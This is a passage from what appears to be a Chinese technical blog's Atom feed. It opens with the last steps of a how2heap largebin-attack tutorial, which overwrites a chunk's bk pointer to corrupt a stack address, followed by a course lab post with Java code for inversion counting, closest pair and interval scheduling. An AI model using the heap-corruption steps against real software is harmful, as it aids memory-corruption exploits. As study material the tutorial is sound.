会按照大小排序）。覆盖掉栈变量。覆盖 bk 为 stack_var1-0x1</li><li>再次 malloc，会把释放的第三个 chunk 插入到 largebin 中，同时我们的目标已经改写了</li></ul><p><strong>结果</strong></p><p>​栈上地址被覆盖</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;First-fit&quot;&gt;&lt;a href=&quot;#First-fit&quot; class=&quot;headerlink&quot; title=&quot;First-fit&quot;&gt;&lt;/a&gt;First fit&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;hi</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="how2heap" scheme="https://kylinxin.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>算法与程序设计实验</title>
    <link href="https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    <id>https://kylinxin.github.io/2023/10/31/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/</id>
    <published>2023-10-31T15:14:29.000Z</published>
    <updated>2023-10-31T11:10:02.211Z</updated>
    
    <content type="html"><![CDATA[<h1>算法与程序设计实验</h1><p>要求</p><blockquote><p>1.复现代码，写上自己的注释</p><p>2.结果展示</p><p>3.将代码进行修改，bug修改，内容提升</p></blockquote><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="逆序计数"><a href="#逆序计数" class="headerlink" title="逆序计数"></a>逆序计数</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Countlnversions</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>    {<br>        System.out.println(<span class="hljs-string">"请输入待计数逆序的整数序列(以空格分开，各项值都不同)"</span>);<br>        Scanner in=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        String line=in.nextLine();<br>        String[] tokens=line.split(<span class="hljs-string">" "</span>);<br>        <span class="hljs-comment">//获取用户输入的序列</span><br>        <span class="hljs-type">int</span>[] S1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[tokens.length];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;tokens.length;i++)<br>            S1[i]=Integer.parseInt(tokens[i]);<br>        <span class="hljs-type">int</span> count=sortAndCount(S1);<br>        <span class="hljs-comment">//调用实现SAC算法的方法，返回计数结果</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;S1.length;i++)<br>            System.out.print(S1[i]+<span class="hljs-string">" "</span>);<br>        System.out.print(<span class="hljs-string">"\n逆序计数为："</span>+count);<br>        <span class="hljs-comment">//显示排序后的序列和逆序计数值</span><br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sortAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]S)</span>{<br>        <span class="hljs-keyword">if</span>(S.length==<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n=S.length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[] A=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n];<br>        <span class="hljs-type">int</span>[] B=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[S.length-n];<br>        <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;A.length;i++)<br>            A[i]=S[j++];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;B.length;i++)<br>            B[i]=S[j++];<br>        <span class="hljs-type">int</span> rA=sortAndCount(A);<br>        <span class="hljs-type">int</span> rB=sortAndCount(B);<br>        <span class="hljs-type">int</span> r=mergeAndCount(A,B,S);<br>        <span class="hljs-keyword">return</span> (r+rA+rB);<br>    }<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mergeAndCount</span><span class="hljs-params">(<span class="hljs-type">int</span>[]A,<span class="hljs-type">int</span>[]B,<span class="hljs-type">int</span>[]C)</span><br>    {<br>        <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>,k=<span class="hljs-number">0</span>,count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i&lt;A.length&amp;&amp;j&lt;B.length)<br>        {<br>            <span class="hljs-keyword">if</span> (A[i]&gt;B[j])<br>            {<br>                count+=A.length-i;<br>                C[k++]=B[j++];<br>            }<br>            <span class="hljs-keyword">else</span> {<br>                C[k++]=A[i++];<br>            }<br>        }<br>        <span class="hljs-keyword">if</span> (i==A.length&amp;&amp;j&lt; B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=j;l&lt; B.length;l++)<br>                C[k++]=B[l];<br>        <span class="hljs-keyword">if</span> (i&lt; A.length&amp;&amp;j== B.length)<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> l=i;l&lt; A.length;l++)<br>                C[k++]=A[l];<br>        <span class="hljs-keyword">return</span> count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="寻找最近点对"><a href="#寻找最近点对" class="headerlink" title="寻找最近点对"></a>寻找最近点对</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FindClosestPair</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> N=<span class="hljs-number">30</span>;<br>        <span class="hljs-type">int</span> beishu=<span class="hljs-number">5000</span>;<br>        <span class="hljs-type">int</span>[] x=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] x2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] y2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        StdDraw.setXscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setYscale(<span class="hljs-number">0</span>, beishu);<br>        StdDraw.setPenRadius(<span class="hljs-number">0.005</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            x[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            y[i]=(<span class="hljs-type">int</span>)(Math.random()*beishu);<br>            x2[i]=x[i];<br>            y2[i]=y[i];<br>        }<br>        <span class="hljs-type">int</span>[][] pX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[][] pY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][N];<br>        <span class="hljs-type">int</span>[] flagX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-type">int</span>[] flagY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[N];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            StdDraw.point(x[i], y[i]);<br>            flagX[i]=<span class="hljs-number">1</span>;<br>            flagY[i]=<span class="hljs-number">1</span>;<br>        }<br>        Arrays.sort(x);<br>        Arrays.sort(y);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;N;j++){<br>                <span class="hljs-keyword">if</span>(x[i]==x2[j]&amp;&amp;flagX[j]==<span class="hljs-number">1</span>){<br>                    pX[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pX[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagX[j]=<span class="hljs-number">0</span>;<br>                }<br>                <span class="hljs-keyword">if</span> (y[i]==y2[j]&amp;&amp;flagY[j]==<span class="hljs-number">1</span>){<br>                    pY[<span class="hljs-number">0</span>][i]=x2[j];<br>                    pY[<span class="hljs-number">1</span>][i]=y2[j];<br>                    flagY[j]=<span class="hljs-number">0</span>;<br>                }<br>            }<br>        }<br>        ClosestPairRec(pX,pY,p2);<br>        System.out.println(p2[<span class="hljs-number">0</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">1</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">2</span>]+<span class="hljs-string">" "</span>+p2[<span class="hljs-number">3</span>]);<br>        StdDraw.setPenColor(StdDraw.RED);<br>        StdDraw.line(p2[<span class="hljs-number">0</span>], p2[<span class="hljs-number">1</span>], p2[<span class="hljs-number">2</span>], p2[<span class="hljs-number">3</span>]);<br><br><br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ClosestPairRec</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] pX, <span class="hljs-type">int</span>[][] pY, <span class="hljs-type">int</span>[] p2)</span> {<br>        <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length&lt;=<span class="hljs-number">3</span>){<br>            <span class="hljs-keyword">if</span> (pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">3</span>){<br>                <span class="hljs-type">int</span> d1=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]);<br>                <span class="hljs-type">int</span> d2=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-type">int</span> d3=(pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>])+(pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])* (pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]-pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>]);<br>                <span class="hljs-keyword">if</span>(d1&gt;=d2&amp;&amp;d1&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d2&gt;=d1&amp;&amp;d2&gt;=d3){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>                <span class="hljs-keyword">if</span>(d3&gt;=d1&amp;&amp;d3&gt;=d2){<br>                    p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                    p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>];<br>                    p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br>                }<br>            }<br>            <span class="hljs-keyword">if</span>(pX[<span class="hljs-number">0</span>].length==<span class="hljs-number">2</span>){<br>                p2[<span class="hljs-number">0</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">1</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>];<br>                p2[<span class="hljs-number">2</span>]=pX[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>];<br>                p2[<span class="hljs-number">3</span>]=pX[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>            }<br>            <span class="hljs-keyword">return</span>;<br>        }<br>        <span class="hljs-type">int</span> <span class="hljs-variable">foreHalf</span> <span class="hljs-operator">=</span> pX[<span class="hljs-number">0</span>].length/<span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span>[][] qX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] qY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][foreHalf];<br>        <span class="hljs-type">int</span>[][] rX=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[][] rY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length-foreHalf];<br>        <span class="hljs-type">int</span>[] qp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span>[] rp2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(i&lt;foreHalf) {<br>                qX[<span class="hljs-number">0</span>][i] = pX[<span class="hljs-number">0</span>][i];<br>                qX[<span class="hljs-number">1</span>][i] = pX[<span class="hljs-number">1</span>][i];<br>                qY[<span class="hljs-number">0</span>][i] = pY[<span class="hljs-number">0</span>][i];<br>                qY[<span class="hljs-number">1</span>][i] = pY[<span class="hljs-number">1</span>][i];<br>            }<br>            <span class="hljs-keyword">else</span>{<br>                rX[<span class="hljs-number">0</span>][k] = pX[<span class="hljs-number">0</span>][i];<br>                rX[<span class="hljs-number">1</span>][k] = pX[<span class="hljs-number">1</span>][i];<br>                rY[<span class="hljs-number">0</span>][k] = pY[<span class="hljs-number">0</span>][i];<br>                rY[<span class="hljs-number">1</span>][k] = pY[<span class="hljs-number">1</span>][i];<br>                k=k+<span class="hljs-number">1</span>;<br>            }<br>        }<br><br>        ClosestPairRec(qX,qY,qp2);<br>        ClosestPairRec(rX,rY,rp2);<br>        <span class="hljs-type">int</span> dd1=(qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])* (qp2[<span class="hljs-number">2</span>]-qp2[<span class="hljs-number">0</span>])+(qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>])* (qp2[<span class="hljs-number">1</span>]-qp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> dd2=(rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])* (rp2[<span class="hljs-number">2</span>]-rp2[<span class="hljs-number">0</span>])+(rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>])* (rp2[<span class="hljs-number">1</span>]-rp2[<span class="hljs-number">3</span>]);<br>        <span class="hljs-type">int</span> d2=Math.min(dd2,dd1);<br>        <span class="hljs-type">double</span> d=Math.sqrt(d2);<br>        <span class="hljs-keyword">if</span> (dd1&lt;dd2){<br>            p2[<span class="hljs-number">0</span>]=qp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=qp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=qp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=qp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-keyword">else</span>{<br>            p2[<span class="hljs-number">0</span>]=rp2[<span class="hljs-number">0</span>];<br>            p2[<span class="hljs-number">1</span>]=rp2[<span class="hljs-number">1</span>];<br>            p2[<span class="hljs-number">2</span>]=rp2[<span class="hljs-number">2</span>];<br>            p2[<span class="hljs-number">3</span>]=rp2[<span class="hljs-number">3</span>];<br>        }<br>        <span class="hljs-type">int</span>[][] sY=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">2</span>][pX[<span class="hljs-number">0</span>].length];<br>        <span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;pX[<span class="hljs-number">0</span>].length;i++){<br>            <span class="hljs-keyword">if</span>(pY[<span class="hljs-number">0</span>][i]&gt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]-d)&amp;&amp;pY[<span class="hljs-number">0</span>][i]&lt;(pX[<span class="hljs-number">0</span>][foreHalf-<span class="hljs-number">1</span>]+d)){<br>                sY[<span class="hljs-number">0</span>][count]=pY[<span class="hljs-number">0</span>][i];<br>                sY[<span class="hljs-number">1</span>][count]=pY[<span class="hljs-number">1</span>][i];<br>                count=count+<span class="hljs-number">1</span>;<br>            }<br>        }<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;count;i++){<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=<span class="hljs-number">15</span>&amp;&amp;(j+<span class="hljs-number">1</span>)&lt;count;j++){<br>                <span class="hljs-type">int</span> dl=(sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])* (sY[<span class="hljs-number">0</span>][i]-sY[<span class="hljs-number">0</span>][i+j])+(sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j])* (sY[<span class="hljs-number">1</span>][i]-sY[<span class="hljs-number">1</span>][i+j]);<br>                <span class="hljs-keyword">if</span>(dl&lt;d2){<br>                    d2=dl;<br>                    p2[<span class="hljs-number">0</span>]=sY[<span class="hljs-number">0</span>][i];<br>                    p2[<span class="hljs-number">1</span>]=sY[<span class="hljs-number">1</span>][i];<br>                    p2[<span class="hljs-number">2</span>]=sY[<span class="hljs-number">0</span>][i+j];<br>                    p2[<span class="hljs-number">3</span>]=sY[<span class="hljs-number">1</span>][i+j];<br>                }<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="时序分配"><a href="#时序分配" class="headerlink" title="时序分配"></a>时序分配</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-comment">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="hljs-comment">// (powered by FernFlower decompiler)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntervarSchedulingDemo</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">IntervarSchedulingDemo</span><span class="hljs-params">()</span> {<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">int</span> <span class="hljs-variable">isN</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">gis</span> <span class="hljs-operator">=</span> <span class="hljs-number">50</span>;<br>        <span class="hljs-type">int</span>[] isF = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isF2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isS2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isY2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span>[] isR = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">beishu</span> <span class="hljs-operator">=</span> gis;<br>        <span class="hljs-type">int</span>[] flagX = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[isN];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span 